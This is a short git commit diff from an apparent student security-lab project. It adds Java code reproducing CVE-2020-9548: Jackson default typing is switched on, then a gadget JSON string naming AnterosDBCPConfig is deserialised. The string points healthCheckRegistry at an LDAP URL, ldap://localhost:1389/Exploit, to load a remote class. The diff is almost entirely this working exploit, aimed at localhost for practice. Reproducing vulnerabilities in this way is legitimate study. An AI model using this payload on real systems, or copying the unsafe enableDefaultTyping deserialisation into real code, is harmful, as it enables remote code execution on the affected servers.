e6d28dfd11876283c9d7ce1a6eb1a11060c72516
SeongMin1000 <russoll3579@gmail.com>
2022-01-25 03:35:33 +0900

    CVE-2020-9548 취약점(이렇게 하는 거 맞나...)

--- attack/src/main/java/keeper/log4j/attack/service/MainManageService.java
+++ attack/src/main/java/keeper/log4j/attack/service/MainManageService.java
@@ -2,6 +2,10 @@ package keeper.log4j.attack.service;
 
 import org.springframework.stereotype.Service;
 
+
+import com.fasterxml.jackson.databind.ObjectMapper;
+import java.io.IOException;
+
 @Service
 public class MainManageService {
 
@@ -16,6 +20,16 @@ public class MainManageService {
    * 취약한 자바 클래스
    */
   public void attackJavaClass(){
+    ObjectMapper mapper = new ObjectMapper();
+
+    mapper.enableDefaultTyping();
+
+    String json = "[\"br.com.anteros.dbcp.AnterosDBCPConfig\", {\"healthCheckRegistry\": \"ldap://localhost:1389/Exploit\"}]";
+    try {
+      mapper.readValue(json, Object.class);
+    } catch (IOException e) {
+      e.printStackTrace();
+    }
 
   }
 }
